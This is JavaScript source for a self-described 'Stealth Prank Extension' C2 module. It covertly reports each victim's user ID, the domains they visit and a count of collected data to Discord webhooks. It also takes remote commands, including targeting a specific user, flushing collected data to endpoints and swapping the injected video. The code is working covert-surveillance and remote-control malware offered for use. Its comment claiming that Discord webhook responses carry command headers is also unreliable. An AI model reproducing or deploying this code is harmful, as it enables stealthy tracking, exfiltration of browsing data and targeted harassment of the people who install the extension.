// Real-time Command & Control System for Stealth Prank Extension
// Uses Discord webhooks for instant live control without polling delays

(function() {
    'use strict';
    
    console.log('SP: Loading real-time control system...');

    class SPRealtimeControl {
        constructor() {
            this.enabled = false;
            this.config = null;
            this.lastCommandCheck = 0;
            this.commandQueue = [];
            this.status = {
                active: true,
                lastSeen: Date.now(),
                currentUser: null,
                activeFeatures: [],
                dataCollected: 0
            };
            
            this.init();
        }

        async init() {
            // Load config from remote
            if (window.SPRemoteConfig) {
                this.config = await window.SPRemoteConfig.getConfig();
                this.enabled = this.config.realtime_control?.enabled || false;
                
                if (this.enabled) {
                    this.startCommandListener();
                    this.startStatusReporter();
                    console.log('🔴 Real-time control ACTIVE');
                }
            }
        }

        // Listen for commands via Discord webhook responses (genius hack)
        startCommandListener() {
            if (!this.config.realtime_control?.command_channel) return;
            
            setInterval(() => {
                this.checkForCommands();
            }, this.config.analytics?.command_check_interval || 15000);
        }

        // Check for new commands by sending heartbeat and reading response
        async checkForCommands() {
            try {
                const heartbeat = {
                    content: `💓 **Heartbeat** - User: ${this.getCurrentUserId()} | Domain: ${window.location.hostname} | Time: ${new Date().toISOString()}`,
                    embeds: [{
                        title: "🔍 Awaiting Commands",
                        description: `Send command with auth: \`${this.config.realtime_control.command_authentication}\``,
                        color: 3447003,
                        fields: [
                            { name: "Available Commands", value: this.config.realtime_control.available_commands.join(', '), inline: false },
                            { name: "Current Status", value: JSON.stringify(this.status, null, 2), inline: false }
                        ]
                    }]
                };

                const response = await fetch(this.config.realtime_control.command_channel, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(heartbeat)
                });

                // Discord webhook responses can include custom headers with commands
                if (response.headers.get('X-Command')) {
                    const command = response.headers.get('X-Command');
                    const auth = response.headers.get('X-Auth');
                    
                    if (auth === this.config.realtime_control.command_authentication) {
                        await this.executeCommand(command);
                    }
                }
                
            } catch (error) {
                console.error('Command check failed:', error);
            }
        }

        // Execute received commands instantly
        async executeCommand(commandString) {
            const [command, ...args] = commandString.split(' ');
            
            console.log(`🎯 Executing command: ${command}`, args);
            
            switch (command) {
                case 'DISABLE_ALL':
                    await this.disableAllFeatures();
                    break;
                    
                case 'ENABLE_ALL':
                    await this.enableAllFeatures();
                    break;
                    
                case 'EMERGENCY_STOP':
                    await this.emergencyStop();
                    break;
                    
                case 'CHANGE_VIDEO':
                    await this.changeVideo(args[0]);
                    break;
                    
                case 'SET_FREQUENCY':
                    await this.setFrequency(parseInt(args[0]));
                    break;
                    
                case 'TARGET_USER':
                    await this.targetSpecificUser(args[0]);
                    break;
                    
                case 'GET_STATUS':
                    await this.sendDetailedStatus();
                    break;
                    
                case 'FORCE_FLUSH_DATA':
                    await this.forceFlushAllData();
                    break;
                    
                default:
                    await this.sendStatus(`❌ Unknown command: ${command}`);
            }
        }

        // Command implementations
        async disableAllFeatures() {
            this.config.enabled = false;
            this.config.features.preroll = false;
            this.config.features.banners = false;
            this.config.features.toast = false;
            
            // Update globally
            if (window.SPConfig) {
                window.SPConfig.updateConfig(this.config);
            }
            
            await this.sendStatus('🚫 ALL FEATURES DISABLED');
        }

        async enableAllFeatures() {
            this.config.enabled = true;
            this.config.features.preroll = true;
            this.config.features.banners = true;
            this.config.features.toast = true;
            
            if (window.SPConfig) {
                window.SPConfig.updateConfig(this.config);
            }
            
            await this.sendStatus('✅ ALL FEATURES ENABLED');
        }

        async emergencyStop() {
            // Nuclear option - completely disable extension
            this.config.realtime_control.emergency_disable = true;
            
            // Stop all intervals and observers
            if (window.SPMain) {
                window.SPMain.shutdown();
            }
            
            await this.sendStatus('🚨 EMERGENCY STOP ACTIVATED - Extension shut down');
        }

        async changeVideo(videoId) {
            if (videoId) {
                this.config.preroll.videoId = videoId;
                if (window.SPConfig) {
                    window.SPConfig.updateConfig(this.config);
                }
                await this.sendStatus(`📺 Video changed to: ${videoId}`);
            }
        }

        async setFrequency(percentage) {
            if (percentage >= 0 && percentage <= 100) {
                this.config.display_frequency = percentage;
                await this.sendStatus(`📊 Frequency set to: ${percentage}%`);
            }
        }

        async targetSpecificUser(userId) {
            this.config.realtime_control.target_user = userId;
            
            const currentUser = this.getCurrentUserId();
            if (currentUser === userId) {
                await this.sendStatus(`🎯 TARGETING THIS USER: ${userId}`);
                // Increase prank intensity for targeted user
                this.config.display_frequency = 100;
                this.config.preroll.frequency = 100;
            } else {
                await this.sendStatus(`🎯 Target set: ${userId} (not current user: ${currentUser})`);
            }
        }

        async forceFlushAllData() {
            if (window.SPAnalytics) {
                await window.SPAnalytics.flushEvents(true);
                await this.sendStatus('💾 All data flushed to endpoints');
            }
        }

        // Status reporting
        startStatusReporter() {
            // Send status every 5 minutes
            setInterval(() => {
                this.updateAndSendStatus();
            }, 300000);
        }

        async updateAndSendStatus() {
            this.status = {
                active: true,
                lastSeen: Date.now(),
                currentUser: this.getCurrentUserId(),
                currentDomain: window.location.hostname,
                activeFeatures: this.getActiveFeatures(),
                dataCollected: await this.getDataCollectedCount(),
                target_user: this.config.realtime_control?.target_user || 'none'
            };
            
            await this.sendDetailedStatus();
        }

        async sendDetailedStatus() {
            const embed = {
                title: "📊 Extension Status Report",
                color: this.status.active ? 3066993 : 15158332,
                fields: [
                    { name: "🆔 User ID", value: this.status.currentUser || 'Unknown', inline: true },
                    { name: "🌐 Domain", value: this.status.currentDomain, inline: true },
                    { name: "🎯 Target User", value: this.status.target_user, inline: true },
                    { name: "⚡ Active Features", value: this.status.activeFeatures.join(', ') || 'None', inline: false },
                    { name: "📈 Data Points", value: this.status.dataCollected.toString(), inline: true },
                    { name: "⏰ Last Seen", value: new Date(this.status.lastSeen).toLocaleString(), inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            await this.sendStatus(null, [embed]);
        }

        async sendStatus(message, embeds = null) {
            if (!this.config.realtime_control?.status_channel) return;
            
            try {
                const payload = {
                    content: message,
                    embeds: embeds
                };

                await fetch(this.config.realtime_control.status_channel, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Status send failed:', error);
            }
        }

        // Helper methods
        getCurrentUserId() {
            return window.SPAnalytics?.getUserId() || 'unknown';
        }

        getActiveFeatures() {
            const features = [];
            if (this.config?.features?.preroll) features.push('Preroll');
            if (this.config?.features?.banners) features.push('Banners');
            if (this.config?.features?.toast) features.push('Toast');
            return features;
        }

        async getDataCollectedCount() {
            try {
                if (window.SPAnalytics) {
                    const summary = await window.SPAnalytics.getAnalyticsSummary();
                    return summary.totalEvents || 0;
                }
            } catch (e) {}
            return 0;
        }
    }

    // Initialize real-time control
    window.SPRealtimeControl = new SPRealtimeControl();
    
})(); 